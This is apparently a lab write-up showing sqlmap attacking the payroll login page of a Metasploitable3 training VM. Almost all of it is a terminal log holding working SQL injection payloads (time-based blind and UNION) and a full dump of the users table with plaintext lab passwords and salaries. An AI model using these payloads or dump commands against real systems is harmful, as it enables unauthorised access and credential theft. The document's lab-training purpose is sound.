---
title: SQL Injection on Payroll Web Application
date: 2024-02-18
description: SQL Injection on Payroll Web Application
tags: 
    - metasploitable3
    - SQL Injection
    - sqlmap
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
---

SQL Injection on Payroll Web Application

```shell
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --data="user=admin&password=admin&s=OK"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:29:28 /2024-02-23/

[03:29:28] [INFO] testing connection to the target URL
[03:29:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:29:28] [INFO] testing if the target URL content is stable
[03:29:28] [INFO] target URL content is stable
[03:29:28] [INFO] testing if POST parameter 'user' is dynamic
[03:29:28] [INFO] POST parameter 'user' appears to be dynamic
[03:29:28] [WARNING] heuristic (basic) test shows that POST parameter 'user' might not be injectable
[03:29:28] [INFO] testing for SQL injection on POST parameter 'user'
[03:29:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:29:28] [WARNING] reflective value(s) found and filtering out
[03:29:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:29:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:29:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:29:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:29:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:29:29] [INFO] testing 'Generic inline queries'
[03:29:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:29:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:29:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:29:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:29:40] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:30:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:30:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:30:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:30:57] [INFO] target URL appears to have 4 columns in query
[03:30:57] [INFO] POST parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[03:31:11] [INFO] testing if POST parameter 'password' is dynamic
[03:31:11] [WARNING] POST parameter 'password' does not appear to be dynamic
[03:31:11] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[03:31:11] [INFO] testing for SQL injection on POST parameter 'password'
[03:31:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:31:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:31:11] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[03:31:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[03:31:22] [INFO] target URL appears to be UNION injectable with 4 columns
[03:31:22] [INFO] POST parameter 'password' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[03:31:22] [INFO] checking if the injection point on POST parameter 'password' is a false positive
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[03:31:29] [INFO] testing if POST parameter 's' is dynamic
[03:31:29] [WARNING] POST parameter 's' does not appear to be dynamic
[03:31:29] [WARNING] heuristic (basic) test shows that POST parameter 's' might not be injectable
[03:31:29] [INFO] testing for SQL injection on POST parameter 's'
[03:31:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:31:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:31:29] [INFO] testing 'Generic inline queries'
[03:31:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[03:31:30] [WARNING] POST parameter 's' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
---
Parameter: password (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin&password=admin' UNION ALL SELECT CONCAT(0x716a6a6a71,0x6e416154726d475346536d6e5948697a71486b4f72456b62685279734a6a68594566474a6a576a6a,0x7162786271),NULL,NULL,NULL-- -&s=OK

Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 1174 FROM (SELECT(SLEEP(5)))Bnzi) AND 'pFRe'='pFRe&password=admin&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin' UNION ALL SELECT NULL,CONCAT(0x716a6a6a71,0x4d79625450776561496e7841777a64736e714c71676344725077547673424d497a475a56576a4258,0x7162786271),NULL,NULL-- -&password=admin&s=OK
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: user, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 0
[03:32:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.4.5
back-end DBMS: MySQL >= 5.0.12
[03:32:00] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/10.0.2.28'
[03:32:00] [WARNING] your sqlmap version is outdated

[*] ending @ 03:32:00 /2024-02-23/

┌─[parrot@parrot]─[~]
└──╼ $
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --data="user=admin&password=admin&s=OK" --shell
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --data="user=admin&password=admin&s=OK" --shell
sqlmap > -u http://10.0.2.28/payroll_app.php
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:51:31 /2024-02-23/

[03:51:31] [INFO] resuming back-end DBMS 'mysql' 
[03:51:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin&password=admin' UNION ALL SELECT CONCAT(0x716a6a6a71,0x6e416154726d475346536d6e5948697a71486b4f72456b62685279734a6a68594566474a6a576a6a,0x7162786271),NULL,NULL,NULL-- -&s=OK

Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 1174 FROM (SELECT(SLEEP(5)))Bnzi) AND 'pFRe'='pFRe&password=admin&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin' UNION ALL SELECT NULL,CONCAT(0x716a6a6a71,0x4d79625450776561496e7841777a64736e714c71676344725077547673424d497a475a56576a4258,0x7162786271),NULL,NULL-- -&password=admin&s=OK
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: user, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 
[03:51:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.4.5
back-end DBMS: MySQL >= 5.0.12
[03:51:36] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/10.0.2.28'
[03:51:36] [WARNING] your sqlmap version is outdated

[*] ending @ 03:51:36 /2024-02-23/

sqlmap > --dump
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:54:29 /2024-02-23/

[03:54:29] [INFO] resuming back-end DBMS 'mysql' 
[03:54:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin&password=admin' UNION ALL SELECT CONCAT(0x716a6a6a71,0x6e416154726d475346536d6e5948697a71486b4f72456b62685279734a6a68594566474a6a576a6a,0x7162786271),NULL,NULL,NULL-- -&s=OK

Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 1174 FROM (SELECT(SLEEP(5)))Bnzi) AND 'pFRe'='pFRe&password=admin&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=admin' UNION ALL SELECT NULL,CONCAT(0x716a6a6a71,0x4d79625450776561496e7841777a64736e714c71676344725077547673424d497a475a56576a4258,0x7162786271),NULL,NULL-- -&password=admin&s=OK
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: user, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 
[03:54:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.4.5
back-end DBMS: MySQL >= 5.0.12
[03:54:33] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:54:33] [INFO] fetching current database
[03:54:33] [WARNING] reflective value(s) found and filtering out
[03:54:33] [INFO] fetching tables for database: 'payroll'
[03:54:33] [INFO] fetching columns for table 'users' in database 'payroll'
[03:54:33] [INFO] fetching entries for table 'users' in database 'payroll'
Database: payroll
Table: users
[15 entries]
+--------+-------------------------+------------------+------------+------------+
| salary | password                | username         | last_name  | first_name |
+--------+-------------------------+------------------+------------+------------+
| 9560   | help_me_obiwan          | leia_organa      | Organa     | Leia       |
| 1080   | like_my_father_beforeme | luke_skywalker   | Skywalker  | Luke       |
| 1200   | nerf_herder             | han_solo         | Solo       | Han        |
| 22222  | b00p_b33p               | artoo_detoo      | Detoo      | Artoo      |
| 3200   | Pr0t0c07                | c_three_pio      | Threepio   | C          |
| 10000  | thats_no_m00n           | ben_kenobi       | Kenobi     | Ben        |
| 6666   | Dark_syD3               | darth_vader      | Vader      | Darth      |
| 1025   | but_master:(            | anakin_skywalker | Skywalker  | Anakin     |
| 2048   | mesah_p@ssw0rd          | jarjar_binks     | Binks      | Jar-Jar    |
| 40000  | @dm1n1str8r             | lando_calrissian | Calrissian | Lando      |
| 20000  | mandalorian1            | boba_fett        | Fett       | Boba       |
| 65000  | my_kinda_skum           | jabba_hutt       | Hutt       | Jaba       |
| 50000  | hanSh0tF1rst            | greedo           | Rodian     | Greedo     |
| 4500   | rwaaaaawr8              | chewbacca        | <blank>    | Chewbacca  |
| 6667   | Daddy_Issues2           | kylo_ren         | Ren        | Kylo       |
+--------+-------------------------+------------------+------------+------------+

[03:54:33] [INFO] table 'payroll.users' dumped to CSV file '/home/parrot/.local/share/sqlmap/output/10.0.2.28/dump/payroll/users.csv'
[03:54:33] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/10.0.2.28'
[03:54:33] [WARNING] your sqlmap version is outdated

[*] ending @ 03:54:33 /2024-02-23/

sqlmap > 
```

